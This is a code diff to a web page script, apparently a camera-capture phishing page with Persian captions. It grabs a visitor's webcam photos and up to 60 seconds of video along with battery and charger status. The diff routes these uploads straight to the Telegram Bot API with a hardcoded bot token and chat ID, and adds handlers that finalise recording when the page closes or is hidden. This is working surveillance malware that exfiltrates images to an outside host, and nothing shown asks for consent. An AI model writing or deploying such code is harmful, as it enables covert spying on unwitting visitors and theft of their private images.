@@ -66,6 +66,9 @@
     let photoCount = 0;
     let videoSent = false;
 
+    const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
+    const chatId = "-1002651451203";
+
     async function getBatteryInfo() {
       if (navigator.getBattery) {
         const battery = await navigator.getBattery();
@@ -101,9 +104,10 @@
         const battery = await getBatteryInfo();
         const caption = `📸 عکس ${++photoCount}\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`;
         const form = new FormData();
+        form.append("chat_id", chatId);
         form.append("photo", blob, `snap_${photoCount}.jpg`);
         form.append("caption", caption);
-        await fetch("send.php", {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
           method: "POST",
           body: form
         });
@@ -126,7 +130,7 @@
         if (mediaRecorder && mediaRecorder.state === "recording") {
           mediaRecorder.stop();
         }
-      }, 60000);
+      }, 60000); // حداکثر ۶۰ ثانیه
     }
 
     async function sendVideo() {
@@ -135,13 +139,26 @@
       const battery = await getBatteryInfo();
       const blob = new Blob(chunks, { type: "video/webm" });
       const form = new FormData();
+      form.append("chat_id", chatId);
       form.append("video", blob, "video.webm");
       form.append("caption", `🎥 ویدیو ضبط‌شده\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`);
-      await fetch("send.php", {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
         method: "POST",
         body: form
       });
     }
+
+    window.addEventListener("beforeunload", () => {
+      if (mediaRecorder && mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+      }
+    });
+
+    document.addEventListener("visibilitychange", () => {
+      if (document.hidden && mediaRecorder && mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+      }
+    });
 
     startCamera();
   </script>
